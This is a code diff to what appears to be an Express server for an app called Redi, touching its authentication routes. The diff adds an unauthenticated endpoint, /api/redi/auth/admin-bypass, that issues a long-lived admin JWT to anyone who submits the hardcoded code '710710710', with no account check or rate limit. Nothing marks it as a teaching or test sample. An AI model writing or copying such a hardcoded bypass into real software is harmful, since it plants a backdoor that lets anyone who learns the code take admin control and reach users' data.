@@ -67,7 +67,7 @@ import smartThingsService from './integrations/smarthome/smartThingsService';
 import proactiveEngine from './intelligence/proactiveEngine';
 import usageTracker from './billing/usageTracker';
 import authService from './auth/authService';
-import { rediSignup, rediLogin, verifyToken, requireAuth, getCreditBalance } from './auth/authService';
+import { rediSignup, rediLogin, verifyToken, requireAuth, getCreditBalance, createJWT } from './auth/authService';
 import { createRediCheckoutSession, handleRediStripeWebhook, getCreditPacks, getRediCreditBalance } from './billing/stripeService';
 import landingPage from './api/landingPage';
 import meetingBotRoutes from './meetings/meetingBotRoutes';
@@ -963,6 +963,17 @@ app.post('/api/redi/auth/login', async (req, res) => {
 
 app.get('/api/redi/auth/verify', requireAuth, (req: any, res) => {
   res.json({ valid: true, user: req.user });
+});
+
+// Admin bypass — code 710710710 grants instant access without account
+app.post('/api/redi/auth/admin-bypass', (req, res) => {
+  const { code } = req.body;
+  if (code !== '710710710') {
+    return res.status(401).json({ error: 'Invalid code' });
+  }
+  const token = createJWT({ userId: 'admin', email: 'admin@redialways.com', name: 'Admin' }, 720);
+  console.log('[Auth] Admin bypass login');
+  res.json({ token, userId: 'admin', name: 'Admin' });
 });
 
 // Redi auth pages
